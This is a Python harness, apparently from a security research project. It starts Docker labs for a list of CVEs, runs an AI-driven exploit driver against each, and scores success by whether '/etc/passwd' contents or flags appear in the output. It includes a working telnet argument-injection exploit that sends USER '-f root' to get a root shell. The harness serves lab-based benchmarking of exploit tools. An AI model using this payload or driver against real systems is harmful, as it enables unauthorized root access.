"""Runner: bring up each lab via docker compose → poc-ex driver → score → teardown."""
from __future__ import annotations
import asyncio, json, os, socket, subprocess, sys, time
from pathlib import Path

sys.path.insert(0, '/home/ict/AIEngines/secai/red-space/poc-ex/src')
sys.path.insert(0, '/home/ict/AIEngines/secai/red-space/poc-ex/scripts')
os.chdir('/home/ict/AIEngines/secai/red-space/poc-ex')
os.environ['POC_EX_VERIFY_ENABLED'] = 'true'
os.environ['POC_EX_ALLOWED_TARGETS'] = '127.0.0.1/8,172.16.0.0/12,172.17.0.0/16,172.18.0.0/16,10.0.0.0/8'

LAB_DIR = Path('/home/ict/AIEngines/secai/pentest-space2/poc-lab/targets')
RESULTS_FILE = Path('/home/ict/AIEngines/secai/pentest-space2/poc-lab/results/pocex_run_results.json')
DOCKER_HOST_IP = '172.17.0.1'  # host.docker.internal equivalent

# Labs ordered easy→hard; gitlab skipped (10min+ startup)
LABS = [
    # id, port, tier, known_gap
    ("demo-cmdi-001",               8080, "easy",      False),
    ("nextjs-CVE-2025-29927",       3000, "easy",      False),
    ("vite-CVE-2025-30208",         5173, "easy",      False),
    ("langflow-CVE-2026-33017",     7860, "easy",      False),
    ("inetutils-CVE-2026-24061",      23, "easy",      True),  # telnet = non-HTTP
    ("gotenberg-CVE-2026-40281",    3000, "medium",    False),
    ("vite-CVE-2026-39363",         5173, "medium",    False),
    ("n8n-CVE-2026-21858",          5678, "medium",    False),
    ("nginx-ui-CVE-2026-27944",     9000, "medium",    False),
    ("rails2shell-CVE-2026-66066",  3000, "medium",    False),
    ("wordpress-CVE-2026-63030",      80, "excellent",  False),
    ("php2shell-CVE-2026-109618",     80, "excellent",  False),
    ("comment2shell-CVE-2026-93485",  80, "excellent",  True),  # needs headless browser
    ("click2shell-CVE-unconfirmed",   80, "excellent",  True),  # no public PoC
]


def _compose(lab_id: str, *args) -> subprocess.CompletedProcess:
    dc = LAB_DIR / lab_id / "docker-compose.yml"
    return subprocess.run(
        ["docker", "compose", "-f", str(dc), *args],
        capture_output=True, text=True, timeout=600,
        cwd=str(LAB_DIR / lab_id),
    )


def bring_up(lab_id: str, port: int, wait_s: int = 150) -> bool:
    print(f"  [up] {lab_id}", flush=True)
    r = _compose(lab_id, "up", "-d", "--build")
    if r.returncode != 0:
        print(f"  [up-err] {r.stderr[:200]}", flush=True)
        return False
    # wait for port on any interface
    deadline = time.monotonic() + wait_s
    while time.monotonic() < deadline:
        ip = _get_container_ip(lab_id, port)
        if ip and _tcp_open(ip, port):
            return True
        if _tcp_open("127.0.0.1", port):
            return True
        time.sleep(3)
    print(f"  [up-timeout] {lab_id} port {port} not open after {wait_s}s", flush=True)
    return False


def _get_container_ip(lab_id: str, target_port: int | None = None) -> str | None:
    r = subprocess.run(
        ["docker", "compose", "-f", str(LAB_DIR / lab_id / "docker-compose.yml"),
         "ps", "-q"],
        capture_output=True, text=True, cwd=str(LAB_DIR / lab_id))
    ids = r.stdout.strip().splitlines()
    if not ids:
        return None
    # Inspect all containers; prefer one exposing target_port on a non-bridge network
    import json as _json
    for cid in ids:
        r2 = subprocess.run(["docker", "inspect", cid], capture_output=True, text=True)
        try:
            info = _json.loads(r2.stdout)[0]
        except Exception:
            continue
        networks = (info.get("NetworkSettings") or {}).get("Networks") or {}
        exposed = set((info.get("Config") or {}).get("ExposedPorts") or {})
        port_matches = target_port is None or any(
            str(target_port) in p for p in exposed
        )
        # Pick IP from non-bridge network
        for net_name, net_info in networks.items():
            if net_name != "bridge" and net_info.get("IPAddress") and port_matches:
                return net_info["IPAddress"]
    # Fallback: first container, first non-bridge IP
    r2 = subprocess.run(["docker", "inspect", ids[0]], capture_output=True, text=True)
    try:
        info = _json.loads(r2.stdout)[0]
        networks = (info.get("NetworkSettings") or {}).get("Networks") or {}
        for net_name, net_info in networks.items():
            if net_name != "bridge" and net_info.get("IPAddress"):
                return net_info["IPAddress"]
    except Exception:
        pass
    return None


def _get_lab_network(lab_id: str) -> str | None:
    """Get the docker-compose project network name (non-bridge)."""
    import json as _json
    r = subprocess.run(
        ["docker", "compose", "-f", str(LAB_DIR / lab_id / "docker-compose.yml"), "ps", "-q"],
        capture_output=True, text=True, cwd=str(LAB_DIR / lab_id))
    ids = r.stdout.strip().splitlines()
    for cid in (ids or []):
        r2 = subprocess.run(["docker", "inspect", cid], capture_output=True, text=True)
        try:
            info = _json.loads(r2.stdout)[0]
            nets = list(((info.get("NetworkSettings") or {}).get("Networks") or {}).keys())
            for n in nets:
                if n != "bridge":
                    return n
        except Exception:
            continue
    return None


def _tcp_open(host: str, port: int, timeout: float = 2.0) -> bool:
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except OSError:
        return False


def tear_down(lab_id: str) -> None:
    _compose(lab_id, "down", "-v", "--remove-orphans")
    print(f"  [down] {lab_id}", flush=True)


def _get_target(lab_id: str, port: int) -> tuple[str, str]:
    """Return (target_address, network_name) the poc-ex sandbox can use."""
    ip = _get_container_ip(lab_id, port)
    network = _get_lab_network(lab_id) or "bridge"
    if ip:
        return f"{ip}:{port}", network
    return f"{DOCKER_HOST_IP}:{port}", network


def _score_events(events: list[dict], lab_id: str, stdout_all: str) -> tuple[int, str]:
    """Score 0-10 based on events and stdout."""
    final = next((e for e in events if e.get("type") == "final"), None)
    if final and final.get("ok"):
        return 10, final.get("verdict", "oracle pass")

    # Check stdout for evidence
    combined = stdout_all.lower()
    if any(m in combined for m in ["root:x:0", "root:*:0", "/bin/bash", "/bin/sh", "flag{", "lab_canary"]):
        return 8, "file/flag content in stdout"
    if "etc/passwd" in combined and "root" in combined:
        return 8, "passwd content read"
    if any(m in combined for m in ["exception", "traceback", "stack trace", "internal server error",
                                    "null pointer", "undefined", "error:"]):
        # behavior from target
        return 4, "target error/exception in response"

    # Check if we got any HTTP response
    step_events = [e for e in events if e.get("type") == "step"]
    run_events = [e for e in step_events if e.get("name") == "run" and e.get("status") == "ok"]
    if run_events:
        # Script ran and got response
        if stdout_all.strip():
            return 4, "got response from target"
        return 2, "connected, script ran"

    # Check recon
    recon_ok = any(e.get("name") == "recon" and e.get("status") == "ok" for e in step_events)
    if recon_ok:
        return 2, "recon succeeded, endpoint identified"

    return 0, "no connection / crash before request"


async def run_one(lab_id: str, port: int, description: str, cve: str | None,
                  known_gap: bool) -> dict:
    from poc_ex.exploit.driver import run_exploit, classify
    from poc_ex.poc.db import PocCatalog
    from poc_ex.poc.corpus import PocCorpus
    from poc_ex.sandbox.executor import SandboxExecutor
    from poc_ex.config import get_settings

    settings = get_settings()
    catalog = PocCatalog('data/poc_catalog.sqlite3')
    corpus = None  # no corpus path configured
    executor = SandboxExecutor()

    target, lab_network = _get_target(lab_id, port)
    print(f"  [run] {lab_id} target={target} network={lab_network}", flush=True)

    case, record, _ = classify(description, cve, catalog)
    run_id = f"labcve-{lab_id}"

    events: list[dict] = []
    stdout_lines: list[str] = []
    t0 = time.monotonic()

    try:
        async for ev in run_exploit(
            catalog=catalog, executor=executor, corpus=corpus,
            case=case, cve=cve, record=record,
            message=description, target=target,
            fields={"network": lab_network},
            run_id=run_id,
        ):
            events.append(ev)
            if ev.get("type") == "log" and ev.get("stream") == "stdout":
                stdout_lines.append(ev.get("line", ""))
            elif ev.get("type") == "final":
                print(f"  [final] ok={ev.get('ok')} verdict={ev.get('verdict','')[:80]}", flush=True)
    except Exception as exc:
        print(f"  [exc] {exc}", flush=True)
        events.append({"type": "error", "message": str(exc)})

    elapsed = time.monotonic() - t0
    stdout_all = "\n".join(stdout_lines)
    score, evidence = _score_events(events, lab_id, stdout_all)

    final_ev = next((e for e in events if e.get("type") == "final"), {})
    iters = sum(1 for e in events if e.get("type") == "step" and e.get("name") == "run")

    failure_reason = None
    if score < 10:
        rca = final_ev.get("rca")
        if rca:
            failure_reason = rca[:200]
        else:
            transcript = final_ev.get("transcript", [])
            cats = [t.get("failure_category", "") for t in transcript if t.get("failure_category")]
            if cats:
                failure_reason = f"failure_categories: {', '.join(cats[:5])}"

    return {
        "id": lab_id,
        "score": score,
        "oracle_pass": score == 10,
        "iters": iters,
        "elapsed_s": round(elapsed, 1),
        "evidence": evidence,
        "failure_reason": failure_reason,
        "known_gap": known_gap,
    }


async def main():
    # Load descriptions from cve_set.jsonl
    labs_meta: dict[str, dict] = {}
    with open('/home/ict/AIEngines/secai/pentest-space2/poc-lab/cve_set.jsonl') as f:
        for line in f:
            d = json.loads(line)
            labs_meta[d['id']] = d

    results = []
    RESULTS_FILE.parent.mkdir(parents=True, exist_ok=True)

    for lab_id, port, tier, known_gap in LABS:
        meta = labs_meta.get(lab_id, {})
        description = meta.get("description_for_ai", "")
        cve = meta.get("cve")
        if cve and "unconfirmed" in str(cve).lower():
            cve = None

        print(f"\n{'='*60}", flush=True)
        print(f"LAB: {lab_id} ({tier}) port={port}", flush=True)

        # inetutils telnet — route through poc-ex driver like any other lab
        # (previously used _try_inetutils() which connected to wrong 127.0.0.1:23)

        up = bring_up(lab_id, port, wait_s=150)
        if not up:
            results.append({"id": lab_id, "score": 0, "oracle_pass": False,
                             "iters": 0, "elapsed_s": 0,
                             "evidence": "lab failed to start / port not open",
                             "failure_reason": "docker bring-up failed or port not reachable",
                             "known_gap": known_gap})
            RESULTS_FILE.write_text(json.dumps(results, indent=2, ensure_ascii=False))
            continue

        result = await run_one(lab_id, port, description, cve, known_gap)
        result["tier"] = tier
        results.append(result)
        tear_down(lab_id)
        # Save after each lab
        RESULTS_FILE.write_text(json.dumps(results, indent=2, ensure_ascii=False))

    return results


def _try_inetutils(port: int) -> tuple[int, str, str | None]:
    """Try telnet argument injection via raw socket."""
    import telnetlib
    try:
        # CVE-2026-24061: send USER env with -f root argument injection
        # Telnet negotiation: send IAC SB ENVIRON IS USER -f root IAC SE
        tn = telnetlib.Telnet("127.0.0.1", port, timeout=10)
        # Wait for login prompt negotiation
        time.sleep(2)
        # Send environment with injected -f root
        IAC = bytes([255])
        SB = bytes([250])
        SE = bytes([240])
        WILL = bytes([251])
        DO = bytes([253])
        NEW_ENVIRON = bytes([39])
        IS = bytes([0])
        VAR = bytes([0])
        VALUE = bytes([1])
        # IAC WILL NEW-ENVIRON
        tn.get_socket().send(IAC + WILL + NEW_ENVIRON)
        time.sleep(0.5)
        data = tn.read_very_eager()
        # Send IAC SB NEW-ENVIRON IS VAR "USER" VALUE "-f root" IAC SE
        env_payload = IAC + SB + NEW_ENVIRON + IS + VAR + b"USER" + VALUE + b"-f root" + IAC + SE
        tn.get_socket().send(env_payload)
        time.sleep(2)
        banner = tn.read_very_eager().decode("utf-8", "replace")
        tn.close()
        if "root" in banner.lower() or "$" in banner or "#" in banner:
            return 10, f"got shell banner: {banner[:100]}", None
        if banner:
            return 6, f"got response: {banner[:100]}", "banner received but no clear root shell"
        return 2, "telnet connection made, no clear shell", "no recognizable shell prompt"
    except Exception as e:
        return 0, f"telnet error: {e}", str(e)


if __name__ == "__main__":
    results = asyncio.run(main())
    print("\n\n=== FINAL RESULTS ===")
    total = 0
    passes = 0
    tier_scores: dict = {"easy": [], "medium": [], "excellent": []}
    for r in results:
        score = r.get("score", 0)
        tier = r.get("tier", "?")
        total += score
        if r.get("oracle_pass"):
            passes += 1
        tier_scores.setdefault(tier, []).append(score)
        mark = "✅" if r.get("oracle_pass") else ("⚠️" if score >= 6 else "❌")
        print(f"{mark} {r['id'][:45]:<45} {tier:<10} {score}/10  {r.get('elapsed_s',0):.0f}s  {r.get('evidence','')[:50]}")

    max_score = len(results) * 10
    print(f"\nTotal: {total}/{max_score}  Oracle passes: {passes}/{len(results)}")
    for tier, scores in tier_scores.items():
        if scores:
            avg = sum(scores)/len(scores)
            print(f"  {tier}: avg {avg:.1f}/10  ({len([s for s in scores if s==10])}/{len(scores)} oracle pass)")
